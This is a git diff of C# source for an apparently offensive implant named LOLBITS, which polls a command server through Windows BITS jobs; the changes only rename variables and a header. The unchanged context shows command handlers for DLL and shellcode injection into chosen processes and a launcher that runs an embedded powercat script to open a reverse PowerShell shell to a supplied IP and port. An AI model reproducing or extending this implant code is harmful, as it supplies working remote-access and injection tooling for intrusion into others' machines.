@@ -26,9 +26,9 @@ namespace LOLBITS
         private readonly Jobs _jobsManager;
         private readonly SyscallManager _sysCall;
 
-        public Controller(string Id, string url,string password)
+        public Controller(string id, string url,string password)
         {
-            this._id = Id;
+            this._id = id;
             _p = password;
             _jobsManager = new Jobs(url);
             _sysCall = new SyscallManager();
@@ -98,7 +98,7 @@ namespace LOLBITS
             {
                 filePath = _tempPath + @"\" + _id;
 
-                headers = "reqid: " + _auth;
+                headers = "reqId: " + _auth;
                 Console.WriteLine("next: " + _id);
                 if (_jobsManager.Get(_id, filePath, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_NORMAL))
                 {
@@ -142,7 +142,7 @@ namespace LOLBITS
                     case "inject_dll":
                         {
                             string fileP = _tempPath + @"\" + _id;
-                            string headers = "reqid: " + _auth + "\r\ncontid: " + ContId;
+                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
 
                             if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
@@ -179,7 +179,7 @@ namespace LOLBITS
                     case "inject_shellcode":
                         {
                             string fileP = _tempPath + @"\" + _id;
-                            string headers = "reqid: " + _auth + "\r\ncontid: " + ContId;
+                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
                             int pid = -1;
                             if (file.Commands.Length >= 2)
                                 pid = int.Parse(file.Commands[1]);
@@ -230,7 +230,7 @@ namespace LOLBITS
                     case "send":
                         {
                             string fileP = _tempPath + @"\" + _id;
-                            string headers = "reqid: " + _auth + "\r\ncontid: " + ContId;
+                            string headers = "reqId: " + _auth + "\r\ncontid: " + ContId;
 
                             if (_jobsManager.Get(_id, fileP, headers, BITS4.BG_JOB_PRIORITY.BG_JOB_PRIORITY_FOREGROUND))
                             {
@@ -494,14 +494,14 @@ namespace LOLBITS
     public class LauncherPowershell
     {
 
-        public static void Main(string ip, string puerto)
+        public static void Main(string ip, string port)
         {
             LauncherPowershell obj = new LauncherPowershell();
 
             Thread thr1 = new Thread(obj.ExecutePowershell);
 
 
-            object[] a = new object[] {ip, puerto };
+            object[] a = new object[] {ip, port };
             thr1.Start(a);
         }
 
@@ -509,7 +509,7 @@ namespace LOLBITS
         {
             object[] a = (object[])args;
             string ip = (string)a[0];
-            string puerto = (string)a[1];
+            string port = (string)a[1];
             PowerShellProcessInstance instance = new PowerShellProcessInstance(new Version(2, 0), null, null, false);
             using (Runspace rs = RunspaceFactory.CreateOutOfProcessRunspace(new TypeTable(new string[0]), instance))
             {
@@ -517,7 +517,7 @@ namespace LOLBITS
 
                 Pipeline pipeline = rs.CreatePipeline();
                 pipeline.Commands.AddScript(Powercat.powercatbase64());
-                pipeline.Commands.AddScript("powercat -c " + ip + "  " + puerto + " -ep");
+                pipeline.Commands.AddScript("powercat -c " + ip + "  " + port + " -ep");
                 pipeline.Invoke();
             }
 
@@ -731,10 +731,10 @@ namespace LOLBITS
     
     public class Response
     {   
-        public Response(string output, string reqid)
+        public Response(string output, string reqId)
         {
             Output = output;
-            ReqId = reqid;
+            ReqId = reqId;
         }
         public string Output { get; set; }
         public string ReqId { get; set; }
